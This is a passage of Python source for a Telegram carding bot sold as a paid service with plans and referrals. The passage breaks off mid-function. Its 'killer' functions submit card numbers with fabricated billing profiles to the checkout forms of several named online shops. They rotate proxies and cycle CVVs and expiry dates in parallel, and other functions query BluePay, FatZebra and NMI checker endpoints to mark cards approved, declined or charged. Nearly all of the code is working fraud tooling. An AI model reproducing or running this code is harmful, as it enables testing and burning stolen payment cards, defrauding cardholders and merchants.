            h = re.sub(r"<style\b[^>]*>.*?</style>", " ", h, flags=re.DOTALL|re.I)
            soup = BeautifulSoup(h, "html.parser")
            for tag in soup(["noscript", "template"]): tag.decompose()
            return re.sub(r"\s+", " ", soup.get_text(separator=" ", strip=True)).strip()
        except: pass
    import html as _html
    h = re.sub(r"<script[^>]*>.*?</script>", " ", html, flags=re.DOTALL|re.I)
    h = re.sub(r"<style[^>]*>.*?</style>", " ", h, flags=re.DOTALL|re.I)
    h = re.sub(r"<[^>]+>", " ", h)
    return re.sub(r"\s+", " ", _html.unescape(h)).strip()

def analyze_response(url, html):
    url = url or ""
    if re.search(r"/checkout/[a-f0-9]+/step[2-9]", url):
        return {"status":"APPROVED", "message":"Redirected step2/3"}
    m = re.search(r"[?&](?:error|declined|reason|msg)=([^&]+)", url, re.I)
    if m:
        return {"status":"DECLINED", "message": url_unquote(m.group(1))[:100]}
    visible = extract_visible_text(html)
    vis_lower = visible.lower()
    for phrase in DECLINE_PHRASES:
        if phrase in vis_lower:
            idx = vis_lower.find(phrase)
            s, e = max(0, idx-40), min(len(visible), idx+100)
            return {"status":"DECLINED", "message": visible[s:e].strip()[:90]}
    for phrase in SUCCESS_PHRASES:
        if phrase in vis_lower:
            return {"status":"APPROVED", "message":"Success page"}
    ovr = re.search(r'id="OrderValidationResult"[^>]*value="([^"]+)"', html, re.I)
    if ovr and ovr.group(1).lower() != "valid":
        return {"status":"DECLINED", "message": f"Validation: {ovr.group(1)}"[:90]}
    if re.search(r"/checkout/[a-f0-9]+/step1", url):
        if 'CreditCardNumber' in html or 'PaymentMethod' in html:
            return {"status":"DECLINED", "message":"Form returned"}
    return {"status":"ERROR", "message": f"No Signal (len={len(html)})"}

# ==========================================
# KILLER ATTEMPTS (abbreviated — same as before)
# ==========================================
def attempt_aerojet(card, proxy_str):
    BASE = "https://aerojetsweeper.com"; px = {"http":proxy_str,"https":proxy_str} if proxy_str else None
    profile = gen_profile(); s = fresh_session(proxy_str); t0 = time.perf_counter()
    try:
        r = s.get(f"{BASE}/", proxies=px, timeout=REQ_TIMEOUT)
        if r.status_code != 200: return {"status":"ERROR","msg":f"Home {r.status_code}","time":time.perf_counter()-t0}
        mvisit = s.cookies.get("mvisit")
        if not mvisit: return {"status":"ERROR","msg":"No mvisit","time":time.perf_counter()-t0}
        ch = "9bcb4a"
        try:
            idx = s.get(f"{BASE}/Checkout/Index?m={mvisit}", proxies=px, timeout=REQ_TIMEOUT)
            h = re.search(r"/checkout/([a-f0-9]+)/step1", idx.text)
            if h: ch = h.group(1)
        except: pass
        step1_url = f"{BASE}/checkout/{ch}/step1?m={mvisit}"
        s.get(step1_url, proxies=px, timeout=REQ_TIMEOUT)
        data = {
            'PageOffers[0].OfferId':'161396','PageOffers[0].OfferName':'AeroJet Sweeper $39.99 + FREE SH',
            'PageOffers[0].Quantity':'1','IsHidePayPalForMultiPay':'False','PaymentMethod':'card',
            'ShowCheckoutConfirm':'False','CheckoutConfirmTitle':'','CheckoutConfirmText':'',
            'ContainsCreditCard':'True','ContainsShippingData':'True','ContainsBillingData':'True',
            'ContainsPromoCode':'False','AutoDetectCreditCardType':'True','HasFinalCheckoutButton':'True',
            'IsEmailConfirmationRequired':'False','zipPrecalculation':profile['zip'],
            'CreditCardNumber':card['number'],'CreditCardMonth':card['month'],
            'CreditCardYear':card['year'],'CreditCardSecurityCode':card['cvv'],
            'BillingFirstName':profile['first_name'],'BillingLastName':profile['last_name'],
            'BillingEmail':profile['email'],'BillingPhone':profile['phone'],
            'BillingAddress1':profile['address1'],'BillingZip':profile['zip'],
            'BillingCity':profile['city'],'BillingStateId':profile['state_id'],'BillingCountryId':profile['country_id'],
            'MailingListAgreement':'false','SmsListAgreement':'False',
            'ShippingSameAsBilling':['true','false'],
            'ShippingFirstName':profile['first_name'],'ShippingLastName':profile['last_name'],
            'ShippingAddress1':profile['address1'],'ShippingZip':profile['zip'],
            'ShippingCity':profile['city'],'ShippingStateId':profile['state_id'],
            'ShippingCountryId':profile['country_id'],'ShippingEmail':profile['email'],
            'ShippingPhone':profile['phone'],'CreditCardBin':card['bin'],
        }
        headers_post = {'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'content-type':'application/x-www-form-urlencoded','origin':BASE,'referer':step1_url}
        rp = s.post(f"{BASE}/checkout/{ch}/step1", params={"m":mvisit}, data=data,
                    headers=headers_post, proxies=px, timeout=REQ_TIMEOUT, allow_redirects=False)
        post_location = rp.headers.get('Location', '')
        html = ""
        if "step1" in post_location or rp.status_code == 200:
            try:
                rg = s.get(f"{BASE}/checkout/{ch}/step1?m={mvisit}&", proxies=px, timeout=REQ_TIMEOUT)
                html = rg.text
            except: pass
        if "step2" in post_location or "step3" in post_location:
            return {"status":"APPROVED","msg":"Redirect step2/3","time":time.perf_counter()-t0}
        a = analyze_response(rp.url, html)
        st = a["status"] if a["status"] != "UNKNOWN" else "ERROR"
        return {"status":st,"msg":a["message"],"time":time.perf_counter()-t0}
    except requests.exceptions.Timeout:
        proxy_strike(proxy_str); return {"status":"ERROR","msg":"Timeout","time":time.perf_counter()-t0}
    except requests.exceptions.ProxyError:
        proxy_strike(proxy_str); return {"status":"ERROR","msg":"Proxy Dead","time":time.perf_counter()-t0}
    except Exception as e: return {"status":"ERROR","msg":type(e).__name__,"time":time.perf_counter()-t0}

def attempt_sensia(card, proxy_str):
    BASE = "https://www.sensiaskin.com"; px = {"http":proxy_str,"https":proxy_str} if proxy_str else None
    profile = gen_profile(); s = fresh_session(proxy_str); t0 = time.perf_counter()
    try:
        s.get(f"{BASE}/", proxies=px, timeout=REQ_TIMEOUT)
        data = [
            ('checkoutFormHidden','1'),('AutoDetectCreditCardType','True'),
            ('PageOffers[0].OfferId','161568'),('PageOffers[0].OfferName','SENSCHAM49_1'),('PageOffers[0].Quantity','2'),
            ('PageOffers[1].OfferId','161569'),('PageOffers[1].OfferName','SENSPINK49_1'),('PageOffers[1].Quantity','0'),
            ('ContainsCreditCard','True'),('ContainsShippingData','True'),('ContainsBillingData','True'),('HasFinalCheckoutButton','True'),
            ('PaymentMethod','card'),('CreditCardNumber',card['number']),('CreditCardMonth',card['month']),('CreditCardYear',card['year']),
            ('CreditCardSecurityCode',card['cvv']),('BillingEmail',profile['email']),('BillingFirstName',profile['first_name']),
            ('BillingLastName',profile['last_name']),('BillingAddress1',profile['address1']),('BillingAddress2',profile['address2']),
            ('BillingZip',profile['zip']),('BillingCity',profile['city']),('BillingCountryId',profile['country_id']),
            ('_country_US','1'),('BillingStateId',profile['state_id']),('BillingPhone',profile['phone']),
            ('ShippingSameAsBilling_reverse','true'),('ShippingSameAsBilling','false'),('MailingListAgreement','true'),
            ('ShippingEmail',profile['email']),('ShippingFirstName',profile['first_name']),('ShippingLastName',profile['last_name']),
            ('ShippingAddress1',profile['address1']),('ShippingZip',profile['zip']),
            ('ShippingCity',profile['city']),('ShippingCountryId',profile['country_id']),('_country_US','1'),
            ('ShippingStateId',profile['state_id']),('ShippingPhone',profile['phone']),('CreditCardBin',card['bin'])
        ]
        r = s.post(f"{BASE}/", data=data, proxies=px, timeout=REQ_TIMEOUT)
        html = r.text
        vm = re.search(r"var\s+valResult\s*=\s*\[([^\]]+)\]", html, re.I)
        if vm:
            vals = [x.strip().strip("'\"") for x in vm.group(1).split(',')]
            if 'Valid' in vals and 'MerchantDecline' not in vals:
                return {"status":"APPROVED","msg":"Valid","time":time.perf_counter()-t0}
            if 'MerchantDecline' in vals:
                return {"status":"DECLINED","msg":"Merchant Decline","time":time.perf_counter()-t0}
            return {"status":"DECLINED","msg":"valResult: " + ",".join(vals)[:40],"time":time.perf_counter()-t0}
        if "thank you" in html.lower(): return {"status":"APPROVED","msg":"Thank You","time":time.perf_counter()-t0}
        if 'CreditCardNumber' in html and 'PaymentMethod' in html:
            return {"status":"DECLINED","msg":"Form Returned","time":time.perf_counter()-t0}
        return {"status":"ERROR","msg":f"Unknown (len={len(html)})","time":time.perf_counter()-t0}
    except requests.exceptions.Timeout:
        proxy_strike(proxy_str); return {"status":"ERROR","msg":"Timeout","time":time.perf_counter()-t0}
    except Exception as e: return {"status":"ERROR","msg":type(e).__name__,"time":time.perf_counter()-t0}

def attempt_dazz(card, proxy_str):
    BASE = "https://buydazz.com"; px = {"http":proxy_str,"https":proxy_str} if proxy_str else None
    profile = gen_profile(); s = fresh_session(proxy_str); t0 = time.perf_counter()
    try:
        s.get(f"{BASE}/", proxies=px, timeout=REQ_TIMEOUT)
        data = {
            "checkoutFormHidden":"1","AutoDetectCreditCardType":"True",
            "PageOffers[0].OfferId":"162141","PageOffers[0].OfferName":"Dazz Standard","PageOffers[0].Quantity":"0",
            "PageOffers[1].OfferId":"162142","PageOffers[1].OfferName":"Dazz Deluxe","PageOffers[1].Quantity":"1",
            "ContainsCreditCard":"True","ContainsShippingData":"True","ContainsBillingData":"True","HasFinalCheckoutButton":"True",
            "PaymentMethod":"card","CreditCardNumber":card['number'],"CreditCardMonth":card['month'],"CreditCardYear":card['year'],
            "CreditCardSecurityCode":card['cvv'],"BillingEmail":profile['email'],"BillingFirstName":profile['first_name'],
            "BillingLastName":profile['last_name'],"BillingAddress1":profile['address1'],"BillingZip":profile['zip'],
            "BillingCity":profile['city'],"BillingCountryId":profile['country_id'],"_country_US":"1","BillingStateId":profile['state_id'],
            "BillingPhone":profile['phone'],"ShippingSameAsBilling":"true","ShippingEmail":profile['email'],
            "ShippingFirstName":profile['first_name'],"ShippingLastName":profile['last_name'],"ShippingAddress1":profile['address1'],
            "ShippingZip":profile['zip'],"ShippingCity":profile['city'],"ShippingCountryId":profile['country_id'],
            "_country_US":"1","ShippingStateId":profile['state_id'],"ShippingPhone":profile['phone'],
            "CreditCardBin":card['bin']
        }
        r = s.post(f"{BASE}/", data=data, proxies=px, timeout=REQ_TIMEOUT)
        html = r.text
        vm = re.search(r"var\s+valResult\s*=\s*\[([^\]]+)\]", html, re.I)
        if vm:
            vals = [x.strip().strip("'\"") for x in vm.group(1).split(',')]
            if 'Valid' in vals and 'MerchantDecline' not in vals:
                return {"status":"APPROVED","msg":"Valid","time":time.perf_counter()-t0}
            if 'MerchantDecline' in vals:
                return {"status":"DECLINED","msg":"Merchant Decline","time":time.perf_counter()-t0}
            return {"status":"DECLINED","msg":"valResult: " + ",".join(vals)[:40],"time":time.perf_counter()-t0}
        if "thank you" in html.lower(): return {"status":"APPROVED","msg":"Thanks","time":time.perf_counter()-t0}
        if 'CreditCardNumber' in html and 'PaymentMethod' in html:
            return {"status":"DECLINED","msg":"Form Returned","time":time.perf_counter()-t0}
        return {"status":"ERROR","msg":f"Unknown (len={len(html)})","time":time.perf_counter()-t0}
    except requests.exceptions.Timeout:
        proxy_strike(proxy_str); return {"status":"ERROR","msg":"Timeout","time":time.perf_counter()-t0}
    except Exception as e: return {"status":"ERROR","msg":type(e).__name__,"time":time.perf_counter()-t0}

def attempt_microtouch(card, proxy_str):
    BASE = "https://microtouchgroom.com"; px = {"http":proxy_str,"https":proxy_str} if proxy_str else None
    profile = gen_profile(); s = fresh_session(proxy_str); t0 = time.perf_counter()
    try:
        r = s.get(f"{BASE}/", proxies=px, timeout=REQ_TIMEOUT)
        if r.status_code != 200: return {"status":"ERROR","msg":f"Home {r.status_code}","time":time.perf_counter()-t0}
        visit_id = s.cookies.get("mvisit")
        if not visit_id: return {"status":"ERROR","msg":"No mvisit","time":time.perf_counter()-t0}
        r = s.post(f"{BASE}/cart/AddOffersQuantity/",
            json={"offers": '[{"offer":"160657","quantity":1}]', "withCartReset": False, "stepNumber": 0,
                  "templateEntryId": 4662009, "landingSlug": None},
            headers={"accept":"*/*","content-type":"application/json","origin":BASE,"referer":f"{BASE}/","x-requested-with":"XMLHttpRequest"},
            proxies=px, timeout=REQ_TIMEOUT)
        try: add = r.json(); order_id = add.get("OrderNumberString") or str(add.get("OrderNumber", ""))
        except: order_id = ""
        if not order_id: return {"status":"ERROR","msg":"No orderId","time":time.perf_counter()-t0}
        r = s.get(f"{BASE}/Checkout/Index", params={"m": visit_id}, proxies=px, timeout=REQ_TIMEOUT)
        m = re.search(r"/checkout/([a-f0-9]+)/step1", r.text)
        if not m: return {"status":"ERROR","msg":"No hash","time":time.perf_counter()-t0}
        h = m.group(1); step1_url = f"{BASE}/checkout/{h}/step1?m={visit_id}"
        s.get(step1_url, proxies=px, timeout=REQ_TIMEOUT)
        xhr = {"accept":"application/json, text/javascript, */*; q=0.01",
               "content-type":"application/x-www-form-urlencoded; charset=UTF-8",
               "origin":BASE,"referer":step1_url,"x-requested-with":"XMLHttpRequest"}
        model = {"ContainsCreditCard":"True","ContainsShippingData":"True","ContainsBillingData":"True",
                 "ShippingCountryId":profile["country_id"],"ShippingFirstName":profile["first_name"],
                 "ShippingLastName":profile["last_name"],"ShippingEmail":profile["email"],"ShippingPhone":profile["phone"],
                 "ShippingAddress1":profile["address1"],"ShippingZip":profile["zip"],"ShippingCity":profile["city"],
                 "ShippingStateId":profile["state_id"],"BillingSameAsShipping":True,"BillingCountryId":profile["country_id"],
                 "BillingFirstName":profile["first_name"],"BillingLastName":profile["last_name"],
                 "BillingEmail":profile["email"],"BillingPhone":profile["phone"],
                 "BillingAddress1":profile["address1"],"BillingZip":profile["zip"],"BillingCity":profile["city"],
                 "BillingStateId":profile["state_id"]}
        s.post(f"{BASE}/checkout/{h}/saveclientinfo",
               data={"model": json.dumps(model, separators=(",",":")), "visitId": visit_id, "orderId": order_id},
               headers=xhr, proxies=px, timeout=REQ_TIMEOUT)
        s.post(f"{BASE}/checkout/{h}/lset",
               data={"response":"CheckoutForm submit true","orderId":order_id},
               headers={**xhr, "accept":"*/*"}, proxies=px, timeout=REQ_TIMEOUT)
        step1_data = {
            "PageOffers[0].OfferId":"161158","PageOffers[0].OfferName":"SH","PageOffers[0].Quantity":"1",
            "CartOffers[0].OfferId":"160657","CartOffers[0].OfferName":"Solo Titanium","CartOffers[0].Quantity":"1",
            "PaymentMethod":"card","ContainsCreditCard":"True","ContainsShippingData":"True","ContainsBillingData":"True",
            "AutoDetectCreditCardType":"True","CreditCardNumber":card["number"],"CreditCardMonth":card["month"],
            "CreditCardYear":card["year"],"CreditCardSecurityCode":card["cvv"],"zipPrecalculation":profile["zip"],
            "ShippingFirstName":profile["first_name"],"ShippingLastName":profile["last_name"],
            "ShippingEmail":profile["email"],"ShippingPhone":profile["phone"],
            "ShippingAddress1":profile["address1"],"ShippingZip":profile["zip"],
            "ShippingCity":profile["city"],"ShippingStateId":profile["state_id"],
            "ShippingCountryId":profile["country_id"],"BillingSameAsShipping":"true",
            "BillingFirstName":profile["first_name"],"BillingLastName":profile["last_name"],
            "BillingEmail":profile["email"],"BillingPhone":profile["phone"],
            "BillingAddress1":profile["address1"],"BillingZip":profile["zip"],
            "BillingCity":profile["city"],"BillingStateId":profile["state_id"],
            "BillingCountryId":profile["country_id"],"CreditCardBin":card["bin"],
        }
        r = s.post(f"{BASE}/checkout/{h}/step1", params={"m": visit_id}, data=step1_data,
                   headers={"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                            "content-type":"application/x-www-form-urlencoded","origin":BASE,"referer":step1_url},
                   proxies=px, timeout=REQ_TIMEOUT, allow_redirects=True)
        elapsed = time.perf_counter() - t0
        analysis = analyze_response(r.url, r.text)
        return {"status": analysis["status"], "msg": analysis["message"], "time": elapsed}
    except requests.exceptions.Timeout:
        proxy_strike(proxy_str); return {"status":"ERROR","msg":"Timeout","time":time.perf_counter()-t0}
    except Exception as e: return {"status":"ERROR","msg":type(e).__name__,"time":time.perf_counter()-t0}

def attempt_ontel(card, proxy_str):
    BASE = "https://ontelcatalog.com"; px = {"http":proxy_str,"https":proxy_str} if proxy_str else None
    profile = gen_profile(); s = fresh_session(proxy_str); t0 = time.perf_counter()
    try:
        r = s.get(f"{BASE}/", proxies=px, timeout=REQ_TIMEOUT)
        if r.status_code != 200: return {"status":"ERROR","msg":f"Home {r.status_code}","time":time.perf_counter()-t0}
        mvisit = s.cookies.get("mvisit")
        if not mvisit: return {"status":"ERROR","msg":"No mvisit","time":time.perf_counter()-t0}
        cart_headers = {"accept":"*/*","buyist-visit":mvisit,"content-type":"application/json","origin":BASE}
        s.post(f"{BASE}/api/cart/add", json={"items":[{"productId":140014,"quantity":1}],"withCartReset":False},
               headers=cart_headers, proxies=px, timeout=REQ_TIMEOUT)
        ch = "3bd189"
        try:
            idx = s.get(f"{BASE}/Checkout/Index?m={mvisit}", proxies=px, timeout=REQ_TIMEOUT)
            h = re.search(r"/checkout/([a-f0-9]+)/step1", idx.text)
            if h: ch = h.group(1)
        except: pass
        checkout_url = f"{BASE}/checkout/{ch}/step1?m={mvisit}"
        s.get(checkout_url, proxies=px, timeout=REQ_TIMEOUT)
        form_data = {
            'CartOffers[0].OfferId':'140014','CartOffers[0].OfferName':'Chill Zone','CartOffers[0].Quantity':'1',
            'PaymentMethod':'card','ContainsCreditCard':'True','ContainsShippingData':'True',
            'ContainsBillingData':'True','AutoDetectCreditCardType':'True','zipPrecalculation':profile['zip'],
            'ShippingEmail':profile['email'],'ShippingFirstName':profile['first_name'],
            'ShippingLastName':profile['last_name'],'ShippingAddress1':profile['address1'],
            'ShippingZip':profile['zip'],'ShippingCity':profile['city'],
            'ShippingStateId':profile['state_id'],'ShippingCountryId':'1',
            'ShippingPhone':profile['phone'],'BillingSameAsShipping':['true','false'],
            'CreditCardNumber':card['number'],'CreditCardMonth':card['month'],
            'CreditCardYear':card['year'],'CreditCardSecurityCode':card['cvv'],'CreditCardBin':card['bin']
        }
        r = s.post(f"{BASE}/checkout/{ch}/step1", params={"m":mvisit}, data=form_data,
                   headers={**s.headers,"content-type":"application/x-www-form-urlencoded","origin":BASE,"referer":checkout_url},
                   proxies=px, timeout=REQ_TIMEOUT, allow_redirects=True)
        elapsed = time.perf_counter() - t0
        analysis = analyze_response(r.url, r.text)
        return {"status": analysis["status"], "msg": analysis["message"], "time": elapsed}
    except requests.exceptions.Timeout:
        proxy_strike(proxy_str); return {"status":"ERROR","msg":"Timeout","time":time.perf_counter()-t0}
    except Exception as e: return {"status":"ERROR","msg":type(e).__name__,"time":time.perf_counter()-t0}

def attempt_with_retry(func, card, proxy, alt=None):
    res = func(card, proxy)
    if res['status'] == 'ERROR':
        print(f"    🔄 Retry: {res['msg'][:40]}")
        time.sleep(0.3)
        res = func(alt if alt else card, proxy)
    return res

# ==========================================
# API CALLS
# ==========================================
def api_bluepay(cc_raw, proxy_url=None):
    t0 = time.perf_counter()
    url = f"{BLUEPAY_API_BASE}/cc={quote(cc_raw, safe='')}"
    if proxy_url: url += f"/proxy={quote(re.sub(r'^https?://','',proxy_url.strip()), safe='')}"
    for att in range(2):
        try:
            r = requests.get(url, timeout=45); el = round(time.perf_counter()-t0, 2)
            if r.status_code != 200:
                if att == 0: time.sleep(1); continue
                return {"status":"ERROR","msg":f"HTTP {r.status_code}","time":el}
            d = r.json(); st = str(d.get('status','UNKNOWN')).upper()
            msg = d.get('message') or d.get('meaning') or 'No message'
            if st == 'APPROVED': return {"status":"APPROVED","msg":str(msg)[:120],"time":el}
            if st in ('DECLINED','HOLD'): return {"status":"DECLINED","msg":str(msg)[:120],"time":el}
            if att == 0: time.sleep(1); continue
            return {"status":"ERROR","msg":f"API: {st}","time":el}
        except requests.exceptions.Timeout:
            if att == 0: continue
            return {"status":"ERROR","msg":"Timeout","time":round(time.perf_counter()-t0,2)}
        except Exception as e:
            if att == 0: continue
            return {"status":"ERROR","msg":f"{type(e).__name__}","time":round(time.perf_counter()-t0,2)}
    return {"status":"ERROR","msg":"Retries failed","time":round(time.perf_counter()-t0,2)}

def api_fatzebra(cc_raw, proxy_url=None):
    t0 = time.perf_counter()
    try:
        url = f"{FATZEBRA_API_BASE}/cc={quote(cc_raw, safe='')}"
        if proxy_url: url += f"/proxy={quote(re.sub(r'^https?://','',proxy_url.strip()), safe='')}"
        r = requests.get(url, timeout=90); el = round(time.perf_counter()-t0, 2)
        if r.status_code != 200: return {"status":"ERROR","msg":f"HTTP {r.status_code}","time":el}
        d = r.json(); st = str(d.get('status','UNKNOWN')).upper(); msg = d.get('message') or 'No message'
        status = 'CHARGED' if st == 'CHARGED' else ('APPROVED' if st == 'APPROVED' else ('DECLINED' if st == 'DECLINED' else 'ERROR'))
        return {"status":status,"msg":str(msg)[:100],"time":el}
    except Exception as e: return {"status":"ERROR","msg":str(e)[:40],"time":round(time.perf_counter()-t0,2)}

def api_nmi(cc_raw, proxy_url=None):
    t0 = time.perf_counter()
    try:
        url = f"{NMI_API_BASE}/cc={quote(cc_raw, safe='')}"
        if proxy_url: url += f"/proxy={quote(re.sub(r'^https?://','',proxy_url.strip()), safe='')}"
        r = requests.get(url, timeout=120); el = round(time.perf_counter()-t0, 2)
        if r.status_code != 200: return {"status":"ERROR","msg":f"HTTP {r.status_code}","time":el}
        d = r.json(); st = str(d.get('status','UNKNOWN')).upper(); msg = d.get('message') or 'No message'
        status = 'CHARGED' if st == 'CHARGED' else ('DECLINED' if st == 'DECLINED' else 'ERROR')
        return {"status":status,"msg":str(msg),"time":el}
    except Exception as e: return {"status":"ERROR","msg":str(e),"time":round(time.perf_counter()-t0,2)}

# ==========================================
# FORMATTERS
# ==========================================
def fmt_killer(gname, card, results, total_t, uname, price=""):
    ap = sum(1 for r in results if r['status'] == 'APPROVED')
    dc = sum(1 for r in results if r['status'] == 'DECLINED')
    fl = sum(1 for r in results if r['status'] == 'ERROR')
    pr = ap + dc
    if ap > 0: ic, st = E_CHECK, f"Killed {E_CHECK}"
    elif dc > 0: ic, st = E_EXCLAMATION, f"Killed {E_EXCLAMATION}"
    else: ic, st = E_SHRUG, f"Failed {E_SHRUG}"
    header = f"{gname} Killer [{price}]" if price else f"{gname} Killer"
    bank, brand, ctype, country, flag = get_bin(card['bin'])
    return (f"{ic} <b>{header} | #{card['bin']}</b>\n____________________\n"
            f"{E_TECH} [<a href='https://t.me/CvexChk'>緒</a>] | <code>{card['number']}|{card['month']}|{card['year']}|{card['cvv']}</code>\n"
            f"{E_FLASH} [<a href='https://t.me/CvexChk'>緒</a>] | {st}\n"
            f"{E_PICTURE} [<a href='https://t.me/CvexChk'>緒</a>] | Processed ({pr}) | Failed ({fl})\n"
            f"· · ─ ·𖥸· ─ · ·\n"
            f"{E_TOOLS} [<a href='https://t.me/CvexChk'>緒</a>] | Bank : {bank}\n"
            f"{E_OCTOPUS} [<a href='https://t.me/CvexChk'>緒</a>] | Info : {brand} | {ctype}\n"
            f"{E_DIZZY} [<a href='https://t.me/CvexChk'>緒</a>] | Country : {country} {flag}\n"
            f"· · ─ ·𖥸· ─ · ·\n"
            f"{E_THOUGHT} <b>Took : {total_t}s</b> | @{uname}")

def fmt_api(gname, card, result, cc_raw, uname, price=""):
    st = result['status']
    if st in ('APPROVED','CHARGED'): ic, st_t = E_CHECK, f"Charged {E_CHECK}"
    elif st == 'DECLINED': ic, st_t = E_EXCLAMATION, f"Declined {E_EXCLAMATION}"
    else: ic, st_t = E_SHRUG, f"Failed {E_SHRUG}"
    header = f"{gname} [{price}]" if price else gname
    bank, brand, ctype, country, flag = get_bin(card['bin'])
    return (f"{ic} <b>{header} | #{card['bin']}</b>\n____________________\n"
            f"{E_TECH} [<a href='https://t.me/CvexChk'>緒</a>] | <code>{cc_raw}</code>\n"
            f"{E_FLASH} [<a href='https://t.me/CvexChk'>緒</a>] | {st_t}\n"
            f"{E_PICTURE} [<a href='https://t.me/CvexChk'>緒</a>] | Message: <b>{result['msg']}</b>\n"
            f"· · ─ ·𖥸· ─ · ·\n"
            f"{E_TOOLS} [<a href='https://t.me/CvexChk'>緒</a>] | Bank : {bank}\n"
            f"{E_OCTOPUS} [<a href='https://t.me/CvexChk'>緒</a>] | Info : {brand} | {ctype}\n"
            f"{E_DIZZY} [<a href='https://t.me/CvexChk'>緒</a>] | Country : {country} {flag}\n"
            f"· · ─ ·𖥸· ─ · ·\n"
            f"{E_THOUGHT} <b>Took : {result['time']}s</b> | @{uname}")

# ==========================================
# PROCESSING
# ==========================================
def process_killer(message, cc_raw, gw_key):
    uid = message.from_user.id; uname = message.from_user.username or 'User'
    try: card = parse_card(cc_raw)
    except: return safe_reply(message, f"{E_EXCLAMATION} Invalid format.", parse_mode='HTML')
    user = get_user(uid)
    if not user: return safe_reply(message, f"{E_CROSS} User not found.", parse_mode='HTML')
    raw_px = [p.strip() for p in user[6].split('\n') if p.strip()] if user[6] else get_default_proxies()
    px_list = alive_proxies(raw_px)
    gname = KILLER_GATEWAYS[gw_key]['name']; gfunc = KILLER_GATEWAYS[gw_key]['func']
    gw = get_gateway(gw_key); price = gw[2] if gw else ""
    hits, workers = 10, 5
    cvvs = rotate_cvvs(card['cvv'], hits); mmyys = gen_mm_yy_list(card['month'], card['year'], hits)
    status_msg = safe_reply(message, f"{E_FLASH} <b>Processing {gname}...</b>\nUsing {len(px_list)} Proxies | Hits: {hits}", parse_mode='HTML')
    print(f"\n[{time.strftime('%H:%M:%S')}] [+] {gname} | {cc_raw} | Hits: {hits} | Proxies: {len(px_list)}")
    print(f"    [CVV]  {', '.join(cvvs)}")
    print(f"    [DATE] {', '.join([f'{m}/{y[-2:]}' for m,y in mmyys])}")
    start = time.perf_counter(); results = []
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = []
        for i in range(hits):
            ac = {"number":card['number'],"bin":card['bin'],"month":mmyys[i][0],"year":mmyys[i][1],"cvv":cvvs[i]}
            alt = {"number":card['number'],"bin":card['bin'],"month":mmyys[(i+1)%hits][0],"year":mmyys[(i+1)%hits][1],"cvv":cvvs[(i+1)%hits]}
            proxy = None
            for att in range(len(px_list)):
                cand = px_list[(i + att) % len(px_list)]
                if cand is None or not is_proxy_burned(cand): proxy = cand; break
            if proxy is None: proxy = px_list[i % len(px_list)]
            fn = {'aerojet':attempt_aerojet,'sensia':attempt_sensia,'dazz':attempt_dazz,'microtouch':attempt_microtouch,'ontel':attempt_ontel}[gfunc]
            futures.append(ex.submit(attempt_with_retry, fn, ac, proxy, alt))
        for f in as_completed(futures):
            res = f.result(); results.append(res)
            icon = "✅" if res['status'] == 'APPROVED' else "❌" if res['status'] == 'DECLINED' else "⚠️"
            print(f"    [{len(results):>2}/{hits}] {icon} {res['status']:<10} | {res['msg']:<40} ({res['time']:.1f}s)")
    total_t = round(time.perf_counter() - start, 1)
    ap = sum(1 for r in results if r['status'] == 'APPROVED')
    dc = sum(1 for r in results if r['status'] == 'DECLINED')
    fl = sum(1 for r in results if r['status'] == 'ERROR')
    print(f"    [+] Result: APPROVED={ap} DECLINED={dc} FAILED={fl} | Took: {total_t}s\n")
    resp = fmt_killer(gname, card, results, total_t, uname, price)
    if status_msg: safe_edit(message.chat.id, status_msg.message_id, resp, parse_mode='HTML', disable_web_page_preview=True)
    else: safe_send(message.chat.id, resp, parse_mode='HTML')

def process_api(message, cc_raw, gw_key):
    uid = message.from_user.id; uname = message.from_user.username or 'User'
    try: card = parse_card(cc_raw)
    except: return safe_reply(message, f"{E_EXCLAMATION} Invalid format.", parse_mode='HTML')
    user = get_user(uid)
    if not user: return safe_reply(message, f"{E_CROSS} User not found.", parse_mode='HTML')
    gw = get_gateway(gw_key); price = gw[2] if gw else ""
    status_msg = safe_reply(message, f"{E_FLASH} <b>Processing {gw_key.upper()}...</b>", parse_mode='HTML')
    proxies = [p.strip() for p in user[6].split('\n') if p.strip()] if user[6] else get_default_proxies()
    result = None
    print(f"\n[{time.strftime('%H:%M:%S')}] [+] {gw_key.upper()} | {cc_raw}")
    for p in proxies:
        fn = {'bl':api_bluepay,'fat':api_fatzebra,'nmi':api_nmi}[gw_key]
        result = fn(cc_raw, p)
        icon = "✅" if result['status'] in ('APPROVED','CHARGED') else "❌" if result['status'] == 'DECLINED' else "⚠️"
        print(f"    {icon} {result['status']:<10} | {result['msg']:<40} ({result['time']}s)")
        if result['status'] != 'ERROR': break
    if not result or result['status'] == 'ERROR':
        err_txt = f"{E_EXCLAMATION} Error: {result['msg'] if result else 'No proxy'}"
        if status_msg: safe_edit(message.chat.id, status_msg.message_id, err_txt, parse_mode='HTML')
        else: safe_send(message.chat.id, err_txt, parse_mode='HTML')
        return
    gw_name = {'bl':'BluePay','fat':'FatZebra','nmi':'NMI'}[gw_key]
    resp = fmt_api(gw_name, card, result, cc_raw, uname, price)
    if status_msg: safe_edit(message.chat.id, status_msg.message_id, resp, parse_mode='HTML', disable_web_page_preview=True)
    else: safe_send(message.chat.id, resp, parse_mode='HTML')

# ==========================================
# MARKUPS
# ==========================================
def get_main_markup(uid):
    kb = [
        [{"text":"Killer","callback_data":"menu_killer","style":"danger","icon_custom_emoji_id":BTN_KILLER},
         {"text":"Gateways","callback_data":"menu_gw_0","style":"primary","icon_custom_emoji_id":BTN_GATEWAY}],
        [{"text":"Refer & Earn","callback_data":"menu_refer","style":"success","icon_custom_emoji_id":BTN_REF},
         {"text":"Plans","callback_data":"menu_plans","style":"primary","icon_custom_emoji_id":BTN_PLANS}],
        [{"text":"Tools","callback_data":"menu_tools","style":"primary","icon_custom_emoji_id":BTN_TOOLS},
         {"text":"Me","callback_data":"menu_me","style":"success","icon_custom_emoji_id":BTN_ME}]
    ]
    if is_admin(uid): kb.append([{"text":"Admin Panel","callback_data":"menu_admin","style":"danger","icon_custom_emoji_id":BTN_ADMIN}])
    return json.dumps({"inline_keyboard":kb})

def get_back_markup():
    return json.dumps({"inline_keyboard":[[{"text":"« Back","callback_data":"menu_main","style":"primary","icon_custom_emoji_id":BTN_BACK}]]})

def get_admin_markup():
    return json.dumps({"inline_keyboard":[
        [{"text":"Add Plan","callback_data":"admin_addplan","style":"success","icon_custom_emoji_id":BTN_PLANS},
